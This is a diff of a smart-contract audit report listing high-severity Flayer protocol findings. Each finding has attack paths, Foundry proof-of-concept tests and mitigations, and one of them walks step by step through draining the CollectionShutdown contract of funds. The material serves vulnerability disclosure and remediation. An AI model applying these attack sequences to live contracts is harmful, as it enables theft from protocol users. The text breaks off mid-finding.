@@ -329,7 +329,303 @@ function test_QuorumOverflow() public {
 
 Employ the appropriate type and cast for `quorumVotes`, e.g. `uint92`.
 
-# Issue H-4: There is a calculation error inside the calculateCompoundedFactor() function, causing users to overpay interest. 
+# Issue H-4: In the `Listings.sol#relist()` function, `listing.created` is not set to `block.timestamp`. 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/164 
+
+## Found by 
+0xAlix2, Audinarey, Ollam, ZeroTrust, araj, blockchain555, cawfree, cnsdkc007, dany.armstrong90, h2134, jecikpo, ydlee, zraxx, zzykxx
+### Summary
+
+The core functionality of the protocol can be blocked by malicious users by not setting `listing.created` to `block.timestamp` in the [`Listings.sol#relist()`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L625-L672) function.
+
+
+### Root Cause
+
+In the `Listings.sol#relist()` function, `listing.created` is not set to `block.timestamp` and it is determined based on the input parameter.
+
+
+### Internal pre-conditions
+
+_No response_
+
+### External pre-conditions
+
+- When a collection is illiquid and we have a disperate number of tokens spread across multiple  users, a pool has to become unusable.
+
+
+### Attack Path
+
+- In [`Listings.sol#L665`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L665), a malicious user sets `listing.created` to `type(uint).max` instead of `block.timestamp` in the `Listings.sol#relist()` function.
+- Next, When a collection is illiquid and we have a disperate number of tokens spread across multiple  users, a pool has to become unusable.
+- In [`CollectionShutdown.sol#L241`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L241), [`_hasListings(_collection)`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L497-L514 ) is always `true`, so the `CollectionShutdown.sol#execute()` function is always reverted.
+
+
+### Impact
+
+The CollectionShutdown function that is core function of the protocol is damaged.
+
+### PoC
+
+```solidity
+function test_CanRelistFloorItemAsLiquidListing(address _lister, address payable _relister, uint _tokenId, uint16 _floorMultiple) public {
+        // Ensure that we don't get a token ID conflict
+        _assumeValidTokenId(_tokenId);
+
+        // Ensure that we don't set a zero address for our lister and filler, and that they
+        // aren't the same address
+        _assumeValidAddress(_lister);
+        _assumeValidAddress(_relister);
+        vm.assume(_lister != _relister);
+
+        // Ensure that our listing multiplier is above 1.00
+        _assumeRealisticFloorMultiple(_floorMultiple);
+
+        // Provide a token into the core Locker to create a Floor item
+        erc721a.mint(_lister, _tokenId);
+
+        vm.startPrank(_lister);
+        erc721a.approve(address(locker), _tokenId);
+
+        uint[] memory tokenIds = new uint[](1);
+        tokenIds[0] = _tokenId;
+
+        // Rather than creating a listing, we will deposit it as a floor token
+        locker.deposit(address(erc721a), tokenIds);
+        vm.stopPrank();
+
+        // Confirm that our listing user has received the underlying ERC20. From the deposit this will be
+        // a straight 1:1 swap.
+        ICollectionToken token = locker.collectionToken(address(erc721a));
+        assertEq(token.balanceOf(_lister), 1 ether);
+
+        vm.startPrank(_relister);
+
+        // Provide our filler with sufficient, approved ERC20 tokens to make the relist
+        uint startBalance = 0.5 ether;
+        deal(address(token), _relister, startBalance);
+        token.approve(address(listings), startBalance);
+
+        // Relist our floor item into one of various collections
+        listings.relist({
+            _listing: IListings.CreateListing({
+                collection: address(erc721a),
+                tokenIds: _tokenIdToArray(_tokenId),
+                listing: IListings.Listing({
+                    owner: _relister,
+-->                 created: uint40(type(uint32).max),
+                    duration: listings.MIN_LIQUID_DURATION(),
+                    floorMultiple: _floorMultiple
+                })
+            }),
+            _payTaxWithEscrow: false
+        });
+
+        vm.stopPrank();
+
+        // Confirm that the listing has been created with the expected details
+        IListings.Listing memory _listing = listings.listings(address(erc721a), _tokenId);
+
+        assertEq(_listing.created, block.timestamp);
+    }
+```
+
+Result:
+```solidity
+Ran 1 test suite in 17.20ms (15.77ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Listings.t.sol:ListingsTest
+[FAIL. Reason: assertion failed: 4294967295 != 3601; counterexample: calldata=0x102a3f2c0000000000000000000000007b71078b91e0cdf997ea0019ceaaec1e461a64ca0000000000000000000000000a255597a7458c26b0d008204a1336eb2fd6aa090000000000000000000000000000000000000000000000000005c3b7d197caff000000000000000000000000000000000000000000000000000000000000006d args=[0x7b71078b91E0CdF997EA0019cEaAeC1E461A64cA, 0x0A255597a7458C26B0D008204A1336EB2fD6AA09, 1622569146370815 [1.622e15], 109]] test_CanRelistFloorItemAsLiquidListing(address,address,uint256,uint16) (runs: 0, μ: 0, ~: 0)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+```
+
+
+### Mitigation
+
+Add the follow lines to the `Listings.sol#relist()` function:
+```solidity
+function relist(CreateListing calldata _listing, bool _payTaxWithEscrow) public nonReentrant lockerNotPaused {
+        // Load our tokenId
+        address _collection = _listing.collection;
+        uint _tokenId = _listing.tokenIds[0];
+
+        // Read the existing listing in a single read
+        Listing memory oldListing = _listings[_collection][_tokenId];
+
+        // Ensure the caller is not the owner of the listing
+        if (oldListing.owner == msg.sender) revert CallerIsAlreadyOwner();
+
+        // Load our new Listing into memory
+        Listing memory listing = _listing.listing;
+
+        // Ensure that the existing listing is available
+        (bool isAvailable, uint listingPrice) = getListingPrice(_collection, _tokenId);
+        if (!isAvailable) revert ListingNotAvailable();
+
+        // We can process a tax refund for the existing listing
+        (uint _fees,) = _resolveListingTax(oldListing, _collection, true);
+        if (_fees != 0) {
+            emit ListingFeeCaptured(_collection, _tokenId, _fees);
+        }
+
+        // Find the underlying {CollectionToken} attached to our collection
+        ICollectionToken collectionToken = locker.collectionToken(_collection);
+
+        // If the floor multiple of the original listings is different, then this needs
+        // to be paid to the original owner of the listing.
+        uint listingFloorPrice = 1 ether * 10 ** collectionToken.denomination();
+        if (listingPrice > listingFloorPrice) {
+            unchecked {
+                collectionToken.transferFrom(msg.sender, oldListing.owner, listingPrice - listingFloorPrice);
+            }
+        }
+
+        // Validate our new listing
+        _validateCreateListing(_listing);
+
+        // Store our listing into our Listing mappings
+        _listings[_collection][_tokenId] = listing;
+
++++     _listings[_collection][_tokenId].created = uint40(block.timestamp);        
+
+        // Pay our required taxes
+        payTaxWithEscrow(address(collectionToken), getListingTaxRequired(listing, _collection), _payTaxWithEscrow);
+
+        // Emit events
+        emit ListingRelisted(_collection, _tokenId, listing);
+    }
+```
+
+# Issue H-5: Stale shutdown params can be reused to drain all funds from `CollectionShutdown` contract 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/173 
+
+## Found by 
+0xc0ffEE, ZeroTrust, kuprum
+### Summary
+
+When a collection is being shutdown via `CollectionShutdown` contract, the shutdown parameters are not properly cleaned up, and can be reused to mount an attack on the contract. In particular, a new collection can be created for the same ERC-721 contract, and then a shutdown may be started again via a particular sequence of calls: `reclaimVote` -> `start`. As  `CollectionShutdown` indexes all internal datastructures and external operations via the address of the ERC-721 contract, this leads to mixing the outdated shutdown parameters with the parameters of the new collection (in particular the old and the new collection token). Moreover, as attacker's balance of the new collection token is now used instead of the old one, the attacker can claim (via `voteAndClaim`) much more than was received from the token sale of the old collection, thus draining all contract funds.
+
+### Root Cause
+
+The execution logic of certain functions of `CollectionShutdown` is flawed; in particular:
+  - Method [reclaimVote](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L356-L377) can be called _after_ the shutdown process started to execute;
+  - Execution of method [start](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L135-L157) is guarded by the precondition `params.shutdownVotes == 0`, which can be made true by the above function `reclaimVote`. Besides that, `start` leaves stale data in `CollectionShutdownParams`.
+
+### Internal pre-conditions
+
+none
+
+### External pre-conditions
+
+none
+
+### Attack Path
+
+1. The attacker creates a collection for some ERC-721 contract
+2. The attacker deposits an NFT, and receives 1 ether of collection token
+3. The attacker starts collection shutdown from address(1)
+4. Shutdown executed normally; some tokens are posted to Sudoswap for sale
+5. The attacker buys NFTs for 100 ether
+6. The attacker reclaims their vote, to enable starting the shutdown again
+7. The attacker creates a new collection for the same ERC-721 contract; a new collection token is created by Locker
+8. The attacker deposits an NFT, and receives 1 ether of the new collection token
+9. The attacker starts collection shutdown again from address(1); this redirects collection token to the new one in shutdown params
+10. The attacker deposits NFTs, and receives 11 ether of the new collection token to address(2)
+11. Attacker votes and claims, reusing stale, partially updated shutdown params
+12. There were 100 ether received from Sudoswap sale upon the first shutdown. As now the attacker claims with their balance of collectionToken2 == 11 ether, they receive 100 ether * 11 == 1100 ether, thus stealing 1000 ether.
+
+### Impact
+
+All funds are drained from the `CollectionShutdown` contract.
+
+### PoC
+
+Drop this test to [CollectionShutdown.t.sol](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/test/utils/CollectionShutdown.t.sol#L51) and execute with `forge test --match-test test_ReuseShutdownParamsToStealFunds`:
+
+```solidity
+function test_ReuseShutdownParamsToStealFunds() public {
+    // Some initial balance of CollectionShutdown
+    vm.deal(address(collectionShutdown), 1000 ether);
+
+    // 1. The attacker creates a collection for some ERC-721 contract (done in the test setup)
+    
+    // 2. The attacker deposits an NFT, and receives 1 ether of collection token
+    vm.startPrank(address(locker));
+    collectionToken.mint(address(1), 1 ether);
+    vm.stopPrank();
+
+    // 3. The attacker starts collection shutdown from address(1)
+    vm.startPrank(address(1));
+    collectionToken.approve(address(collectionShutdown), 1 ether);
+    collectionShutdown.start(address(erc721b));
+    vm.stopPrank();
+
+    // 4. Shutdown executed normally; some tokens are posted to Sudoswap for sale
+    // Mint NFTs into our collection {Locker} and process the execution
+    uint[] memory tokenIds = _mintTokensIntoCollection(erc721b, 3);
+    collectionShutdown.execute(address(erc721b), tokenIds);
+    // Mock the process of the Sudoswap pool liquidating the NFTs for ETH. 
+    
+    // 5. The attacker buys NFTs for 100 ether
+    _mockSudoswapLiquidation(SUDOSWAP_POOL, tokenIds, 100 ether);
+    
+    // 6. The attacker reclaims their vote, to enable starting the shutdown again
+    vm.startPrank(address(1));
+    collectionShutdown.reclaimVote(address(erc721b));
+    vm.stopPrank();
+
+    // 7. The attacker creates a new collection for the same ERC-721
+    locker.createCollection(address(erc721b), 'Test Collection', 'TEST', 0);
+    // Initialize our collection, without inflating `totalSupply` of the {CollectionToken}
+    locker.setInitialized(address(erc721b), true);
+    // A new collection token is created by Locker
+    ICollectionToken collectionToken2 = locker.collectionToken(address(erc721b));
+
+    // 8. The attacker deposits an NFT, and receives 1 ether of the new collection token
+    vm.startPrank(address(locker));
+    collectionToken2.mint(address(1), 1 ether);
+    vm.stopPrank();
+    
+    // 9. The attacker starts collection shutdown again from address(1)
+    // This redirects collection token to the new one in shutdown params
+    vm.startPrank(address(1));
+    collectionToken2.approve(address(collectionShutdown), 1 ether);
+    collectionShutdown.start(address(erc721b));
+    vm.stopPrank();
+
+    // 10. The attacker deposits NFTs, 
+    // and receives 11 ether of the new collection token to address(2)
+    vm.startPrank(address(locker));
+    collectionToken2.mint(address(2), 11 ether);
+    vm.stopPrank();
+
+   // Get our start balances so that we can compare to closing balances from claim
+    uint startBalanceAddress = payable(address(2)).balance;
+
+    // 11. The attacker votes and claims, reusing stale, partially updated shutdown params
+    vm.startPrank(address(2));
+    collectionToken2.approve(address(collectionShutdown), 11 ether);
+    collectionShutdown.voteAndClaim(address(erc721b));
+    vm.stopPrank();
+
+    // 12. There were 100 ether received from Sudoswap sale upon the first shutdown.
+    // As now attacker claims with the balance of collectionToken2 == 11 ether,
+    // they receive 100 ether * 11 == 1100 ether, thus stealing 1000 ether
+    assertEq(payable(address(2)).balance - startBalanceAddress, 1100 ether);
+}
+```
+
+### Mitigation
+
+- Disallow calling `reclaimVote` at any point in time after the shutdown can be executed.
+- In `start`, properly clean up all `CollectionShutdownParams`.
+
+Additionally, we recommend for the `CollectionShutdown` contract to index both internal datastructures and external functions not with the address of an ERC-721 contract, but with the address of a collection token contract. This will help to clearly differentiate between various reincarnations of the same ERC-721 contract as different collections / collection tokens, as well as to enable cleanly shutting down the collection even if some operations are still performed with the ERC-721 tokens.
+
+# Issue H-6: There is a calculation error inside the calculateCompoundedFactor() function, causing users to overpay interest. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/227 
 
@@ -402,7 +698,345 @@ Manual Review
     }
 ```
 
-# Issue H-5: `_listing` mapping not deleted when calling `Listings::reserve` can lead to a token being sold when it shouldn't be for sale 
+# Issue H-7: User can pay less protected listing fees. 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/243 
+
+## Found by 
+dany.armstrong90, jsmi
+## Summary
+`ProtectedListings.unlockProtectedListing()` function create checkpoint after decrease `listingCount[_collection]`.
+Therefore, when user unlock multiple protected listings, user will pay less fees for the second and thereafter listings than the first listing.
+
+## Vulnerability Detail
+`ProtectedListings.unlockProtectedListing()` function is following.
+```solidity
+    function unlockProtectedListing(address _collection, uint _tokenId, bool _withdraw) public lockerNotPaused {
+        // Ensure this is a protected listing
+        ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
+
+        // Ensure the caller owns the listing
+        if (listing.owner != msg.sender) revert CallerIsNotOwner(listing.owner);
+
+        // Ensure that the protected listing has run out of collateral
+        int collateral = getProtectedListingHealth(_collection, _tokenId);
+        if (collateral < 0) revert InsufficientCollateral();
+
+        // cache
+        ICollectionToken collectionToken = locker.collectionToken(_collection);
+        uint denomination = collectionToken.denomination();
+        uint96 tokenTaken = _protectedListings[_collection][_tokenId].tokenTaken;
+
+        // Repay the loaned amount, plus a fee from lock duration
+        uint fee = unlockPrice(_collection, _tokenId) * 10 ** denomination;
+        collectionToken.burnFrom(msg.sender, fee);
+
+        // We need to burn the amount that was paid into the Listings contract
+        collectionToken.burn((1 ether - tokenTaken) * 10 ** denomination);
+
+        // Remove our listing type
+311:    unchecked { --listingCount[_collection]; }
+
+        // Delete the listing objects
+        delete _protectedListings[_collection][_tokenId];
+
+        // Transfer the listing ERC721 back to the user
+        if (_withdraw) {
+            locker.withdrawToken(_collection, _tokenId, msg.sender);
+            emit ListingAssetWithdraw(_collection, _tokenId);
+        } else {
+            canWithdrawAsset[_collection][_tokenId] = msg.sender;
+        }
+
+        // Update our checkpoint to reflect that listings have been removed
+325:    _createCheckpoint(_collection);
+
+        // Emit an event
+        emit ListingUnlocked(_collection, _tokenId, fee);
+    }
+```
+As can be seen, the above function decrease `listingCount[_collection]` in `L311` before creating checkpoint in `L325`.
+However, creating checkpoint uses utilization rate and the utilization rate depends on `listingCount[_collection]`.
+Since `listingCount[_collection]` is already decreased at `L311`, the utilization rate is calculated incorrect and so the checkpoint will be incorrect.
+
+PoC:
+Add the following test code into `ProtectedListings.t.sol`.
+```solidity
+    function test_unlockProtectedListingError() public {
+        erc721a.mint(address(this), 0);
+        erc721a.mint(address(this), 1);
+        
+        erc721a.setApprovalForAll(address(protectedListings), true);
+
+        uint[] memory _tokenIds = new uint[](2); _tokenIds[0] = 0; _tokenIds[1] = 1;
+
+        // create protected listing for tokenId = 0 and tokenId = 1
+        IProtectedListings.CreateListing[] memory _listings = new IProtectedListings.CreateListing[](1);
+        _listings[0] = IProtectedListings.CreateListing({
+            collection: address(erc721a),
+            tokenIds: _tokenIds,
+            listing: IProtectedListings.ProtectedListing({
+                owner: payable(address(this)),
+                tokenTaken: 0.4 ether,
+                checkpoint: 0
+            })
+        });
+        protectedListings.createListings(_listings);
+
+        vm.warp(block.timestamp + 7 days);
+
+        // unlock protected listing for tokenId = 0
+        assertEq(protectedListings.unlockPrice(address(erc721a), 0), 402485479451875840);
+        locker.collectionToken(address(erc721a)).approve(address(protectedListings), 402485479451875840);
+        protectedListings.unlockProtectedListing(address(erc721a), 0, true);
+
+        // unlock protected listing for tokenId = 0, but the unlock price for tokenId = 1 is 402055890410801920 < 402485479451875840 for tokenId = 0.
+        assertEq(protectedListings.unlockPrice(address(erc721a), 1), 402055890410801920);
+        locker.collectionToken(address(erc721a)).approve(address(protectedListings), 402055890410801920);
+        protectedListings.unlockProtectedListing(address(erc721a), 1, true);
+    }
+```
+In the above test code, we can see that user paid less fees for tokenId = 1 than tokenId = 0.
+
+## Impact
+Users will pay less fees. It meanas loss of funds for the protocol.
+
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L287-L329
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+Change the order of decreasing `listingCount[_collection]` and creating checkpoint in `ProtectedListings.unlockProtectedListing()` function as follows.
+```solidity
+    function unlockProtectedListing(address _collection, uint _tokenId, bool _withdraw) public lockerNotPaused {
+        // Ensure this is a protected listing
+        ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
+
+        // Ensure the caller owns the listing
+        if (listing.owner != msg.sender) revert CallerIsNotOwner(listing.owner);
+
+        // Ensure that the protected listing has run out of collateral
+        int collateral = getProtectedListingHealth(_collection, _tokenId);
+        if (collateral < 0) revert InsufficientCollateral();
+
+        // cache
+        ICollectionToken collectionToken = locker.collectionToken(_collection);
+        uint denomination = collectionToken.denomination();
+        uint96 tokenTaken = _protectedListings[_collection][_tokenId].tokenTaken;
+
+        // Repay the loaned amount, plus a fee from lock duration
+        uint fee = unlockPrice(_collection, _tokenId) * 10 ** denomination;
+        collectionToken.burnFrom(msg.sender, fee);
+
+        // We need to burn the amount that was paid into the Listings contract
+        collectionToken.burn((1 ether - tokenTaken) * 10 ** denomination);
+
+        // Remove our listing type
+--      unchecked { --listingCount[_collection]; }
+
+        // Delete the listing objects
+        delete _protectedListings[_collection][_tokenId];
+
+        // Transfer the listing ERC721 back to the user
+        if (_withdraw) {
+            locker.withdrawToken(_collection, _tokenId, msg.sender);
+            emit ListingAssetWithdraw(_collection, _tokenId);
+        } else {
+            canWithdrawAsset[_collection][_tokenId] = msg.sender;
+        }
+
+        // Update our checkpoint to reflect that listings have been removed
+        _createCheckpoint(_collection);
+++      unchecked { --listingCount[_collection]; }
+
+        // Emit an event
+        emit ListingUnlocked(_collection, _tokenId, fee);
+    }
+```
+
+# Issue H-8: Liquidity provided when initializing a collection in Locker.sol will be stuck in Uniswap, with no way for the user to recover it 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/248 
+
+## Found by 
+0x37, BugPull, Feder, KingNFT, Ollam, ZeroTrust, merlinboii, zzykxx
+### Summary
+
+UniswapImplementation.sol does not offer a way to withdraw the initial liquidity provided from the pool, causing the total loss of funds for any user who initializes a pool.
+
+### Root Cause
+
+Interacting with Uniswap v4 requires an peripheral contract to unlock() the PoolManager, which[ then calls unlockCallback()](https://github.com/Uniswap/v4-core/blob/e06fb6a3511d61332db4a9fa05bc4348937c07d4/src/PoolManager.sol#L111) on said peripheral contract. It is the job of unlockContract() to handle any interactions with PoolManager, including modifying liquidity. In UniswapImplementation.sol, the only time it ever calls unlock() on the PoolManager is [once during initialization](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Locker.sol#L388). After that, it is impossible for the Implementation contract to modify the liquidity of the Pool on behalf of the depositor.
+
+Positions in PoolManager are [credited to the contract that calls modifyLiquidity()](https://github.com/Uniswap/v4-core/blob/e06fb6a3511d61332db4a9fa05bc4348937c07d4/src/PoolManager.sol#L162-L169) on it. This means that the Implementation contract technically owns the liquidity provided by the user, and if the contract does not contain logic to withdraw funds on behalf of said user the funds are lost for good.
+
+```solidity
+    function initializeCollection(address _collection, uint _amount0, uint _amount1, uint _amount1Slippage, uint160 _sqrtPriceX96) public override {
+        // Ensure that only our {Locker} can call initialize
+        if (msg.sender != address(locker)) revert CallerIsNotLocker();
+        ...
+        // Obtain the UV4 lock for the pool to pull in liquidity
+@>      poolManager.unlock( // @audit this is the only place unlock is ever called in the Implementation contract
+            abi.encode(CallbackData({
+                poolKey: poolKey,
+                liquidityDelta: LiquidityAmounts.getLiquidityForAmounts({
+                    sqrtPriceX96: _sqrtPriceX96,
+                    sqrtPriceAX96: TICK_SQRT_PRICEAX96,
+                    sqrtPriceBX96: TICK_SQRT_PRICEBX96,
+                    amount0: poolParams.currencyFlipped ? _amount1 : _amount0,
+                    amount1: poolParams.currencyFlipped ? _amount0 : _amount1
+                }),
+                liquidityTokens: _amount1,
+                liquidityTokenSlippage: _amount1Slippage
+            })
+        ));
+    }
+```
+
+```solidity
+    function _unlockCallback(bytes calldata _data) internal override returns (bytes memory) {
+        ...
+        // As this call should only come in when we are initializing our pool, we
+        // don't need to worry about `take` calls, but only `settle` calls.
+@>      (BalanceDelta delta,) = poolManager.modifyLiquidity({ // @audit only place liquidity is ever modified
+            key: params.poolKey,
+            params: IPoolManager.ModifyLiquidityParams({
+                tickLower: MIN_USABLE_TICK,
+                tickUpper: MAX_USABLE_TICK,
+@>              liquidityDelta: int(uint(params.liquidityDelta)), // @audit liquidityDelta cast so that it can only ever be positive
+                salt: ''
+            }),
+            hookData: ''
+        });
+```
+This is in PoolManager.sol:
+```solidity
+    function modifyLiquidity(
+        PoolKey memory key,
+        IPoolManager.ModifyLiquidityParams memory params,
+        bytes calldata hookData
+    ) external onlyWhenUnlocked noDelegateCall returns (BalanceDelta callerDelta, BalanceDelta feesAccrued) {
+        BalanceDelta principalDelta;
+        (principalDelta, feesAccrued) = pool.modifyLiquidity(
+            Pool.ModifyLiquidityParams({
+@>              owner: msg.sender, // @audit owner of liquidity position set to the Implementation contract
+                tickLower: params.tickLower,
+                tickUpper: params.tickUpper,
+                liquidityDelta: params.liquidityDelta.toInt128(),
+                tickSpacing: key.tickSpacing,
+                salt: params.salt
+```
+
+### Internal pre-conditions
+
+_No response_
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+_No response_
+
+### Impact
+
+Users will lose all funds deposited as liquidity in the collection initialization process. That is a minimum loss of 10 NFTs plus whatever WETH was provided for the other side of the liquidity pool. This leaves zero incentive for anyone to initialize a collection on the protocol.
+
+### PoC
+
+Proof of Concept is difficult for this one because the issue is about missing functionality, not broken functionality. However, the following code demonstrates a user initializing a collection and thereby funding a liquidity pool. Given that no function exists to allow the user to withdraw via the implementation contract, I've used PoolModifyLiquidityTest to provide the functionality, showing that it does not work for the original depositor (because it was deposited with a different peripheral contract) but does work for someone who deposits and withdraws via the same contract.
+
+Please copy any paste `import {PoolModifyLiquidityTest} from '@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol';` to the top of Locker.t.sol, and the following test into the body of the file:
+
+```solidity
+    function test_InitializerLosesLiquidityProvided() public {
+
+        address depositoor = makeAddr("depositoor");
+        vm.startPrank(depositoor);
+
+        ERC721Mock astroidDogs = new ERC721Mock();
+        // Approve some of the ERC721Mock collections in our {Listings}
+        locker.createCollection(address(astroidDogs), 'Astroid Dogs', 'ADOG', 0);
+        address adog = address(locker.collectionToken(address(astroidDogs)));
+
+        // mint the depositor enough dogs and eth, approve locker to spend
+        uint[] memory tokenIds = new uint[](10);
+        for (uint i = 0; i < 10; ++i) {
+            astroidDogs.mint(depositoor, i);
+            tokenIds[i] = i;
+            astroidDogs.approve(address(locker), i);
+        }
+        deal(address(WETH), depositoor, 10e18);
+        WETH.approve(address(locker), 10e18);
+
+        // initialize collection
+                                                                        //slippage and squrtPrice //1:1
+        locker.initializeCollection(address(astroidDogs), 10e18, tokenIds, 1, 79228162514264337593543950336);
+
+        // there is no method to withdraw via locker or implementation
+        // does a peripheral contract let us do this?
+        // using poolModifyPosition as a helper
+
+        // peripheral contract to allow deposits and withdrawals
+        PoolModifyLiquidityTest poolModifyPosition = new PoolModifyLiquidityTest(poolManager);
+
+        PoolKey memory key = abi.decode(uniswapImplementation.getCollectionPoolKey(address(astroidDogs)), (PoolKey));
+        IPoolManager.ModifyLiquidityParams memory params = IPoolManager.ModifyLiquidityParams({
+            tickLower: TickMath.minUsableTick(key.tickSpacing),
+            tickUpper: TickMath.maxUsableTick(key.tickSpacing),
+            liquidityDelta: -100,       
+            salt: ""                  
+        });
+
+        // the user who initiated it is unable to withdraw it with a different peripheral contract
+        // that's because the Implementation  contract owns the liquidity
+        vm.expectRevert();
+        poolModifyPosition.modifyLiquidity(key, params, "");
+        
+        // however, this peripheral contract would work for another user who deposits with it
+        address secondDepositor = makeAddr("second");
+        vm.startPrank(secondDepositor);
+
+        // deal and approve funds
+        deal(adog, secondDepositor, 1e18);
+        deal(address(WETH), secondDepositor, 1e18);
+        locker.collectionToken(address(astroidDogs)).approve(address(poolModifyPosition), 10e18);
+        WETH.approve(address(poolModifyPosition), 10e18);
+        
+        // deposit and withdraw - no problem for this user
+        IPoolManager.ModifyLiquidityParams memory depositParams = IPoolManager.ModifyLiquidityParams({
+            tickLower: TickMath.minUsableTick(key.tickSpacing),
+            tickUpper: TickMath.maxUsableTick(key.tickSpacing),
+            liquidityDelta: 1e18,       
+            salt: ""                  
+        });
+        poolModifyPosition.modifyLiquidity(key, depositParams, "");
+
+        IPoolManager.ModifyLiquidityParams memory withdrawParams = IPoolManager.ModifyLiquidityParams({
+            tickLower: TickMath.minUsableTick(key.tickSpacing),
+            tickUpper: TickMath.maxUsableTick(key.tickSpacing),
+            liquidityDelta: -1e18,       
+            salt: ""                  
+        });
+        poolModifyPosition.modifyLiquidity(key, withdrawParams, "");
+    }
+```
+
+### Mitigation
+
+Consider the following changes to UniswapImplementation.sol -
+
+1. Store the user who initializes a collection in a mapping
+2. Change _unlockCallback() such that it doesn't cast liquidityDelta to a uint (must allow negative values for withdrawals)
+3. Add a remove liquidity function to Implementation.sol. It should check that only the initializer of a contract can call it and should call unlock() on the PoolManager, passing in the appropriate calldata to remove liquidity. It should then transfer funds received to the user.
+
+These changes will allow a user to access the liquidity he or she initially provided.
+
+# Issue H-9: `_listing` mapping not deleted when calling `Listings::reserve` can lead to a token being sold when it shouldn't be for sale 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/252 
 
@@ -571,8 +1205,7 @@ Just as in `_fillListing` and `cancelListing` functions, when `reserve` is call 
 This will ensure that even if the token's new protected listing is removed the stale listing will not be accessible.
 
 
-
-# Issue H-6: The Users who voted for collection shutdown will lose their collection tokens by cancelling the shutdown 
+# Issue H-10: The Users who voted for collection shutdown will lose their collection tokens by cancelling the shutdown 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/261 
 
@@ -756,8 +1389,7 @@ Ran 1 test suite in 3.46s (3.46s CPU time): 1 tests passed, 0 failed, 0 skipped 
 ```
 
 
-
-# Issue H-7: User can unlock protected listing without paying any fee. 
+# Issue H-11: User can unlock protected listing without paying any fee. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/269 
 
@@ -873,7 +1505,7 @@ Manual Review
 ## Recommendation
 Adjust `tokenTaken` considering compounded factor in `ProtectedListings.adjustPosition()` function. That is, divide `absAmount` by compounded factor before updating `tokenTaken`.
 
-# Issue H-8: InfernalRiftBelow.thresholdCross verify the wrong msg.sender 
+# Issue H-12: InfernalRiftBelow.thresholdCross verify the wrong msg.sender 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/405 
 
@@ -956,7 +1588,7 @@ We asked sponsor:
 Sponsor reply:
 > good catch, it should be L2_CROSS_DOMAIN_MESSENGER instead
 
-# Issue H-9: InfernalRiftBelow.claimRoyalties no verification msg.sender 
+# Issue H-13: InfernalRiftBelow.claimRoyalties no verification msg.sender 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/406 
 
@@ -1020,8 +1652,7 @@ Manual Review
 +    }
 ```
 
-
-# Issue H-10: ERC1155 cannot claim royalities on L2. 
+# Issue H-14: ERC1155 cannot claim royalities on L2. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/456 
 
@@ -1106,94 +1737,70 @@ function claimRoyalties(address _collectionAddress, address _recipient, address[
 }
 ```
 
+# Issue H-15: Protected listings checkpoints are not always updated when the total supply changes 
 
-# Issue H-11: Creation of listings does not accurately reflect the utilization rate, which could lead to loss of interest 
-
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/530 
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/515 
 
 ## Found by 
-Tendency, blockchain555, valuevalk
-## Summary
-The `createListings()` function in both `Listings.sol` and `ProtectedListing.sol` has a flaw that prevents accurate checkpoint creation.
+Ironsidesec, Sentryx, valuevalk, zzykxx
+### Summary
 
-## Vulnerability Detail
-The main vulnerability is in `ProtectedListing.sol`, where we can call `createListings()` and specify an array of `CreateListing` that we want to create:
+The protocol doesn't update protected listings checkpoints every time the total supply of collection token changes
 
-```solidity
-  function createListings(CreateListing[] calldata _createListings) public nonReentrant lockerNotPaused {
-```
+### Root Cause
 
-The issue lies in the logic that ensures `_createCheckpoint` is only called once per collection. While this is intended, the problem occurs because this action happens **before** all the changes that may affect the **utilization rate**.
+The `ProtectedListing` contract uses a checkpoint system to keep track of the interests to pay. It calculates the current interest rate of a collection based on the [utilization rate](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L261), which depends, among other factors, on the total supply of collection tokens.
 
-```solidity
-  function createListings(CreateListing[] calldata _createListings) public nonReentrant lockerNotPaused {
-  ....Skip Code....
-        for (uint i; i < _createListings.length; ++i) {
-            CreateListing calldata listing = _createListings[i];
-            _validateCreateListing(listing);
+For this system to work correctly everytime the total supply changes a new checkpoint for the collection should be created, but this is not the case as both [Locker::deposit()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L261) and [Locker::redeem()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L198), which mint and burn collection tokens, don't create a new checkpoint in the protected listing contract.
 
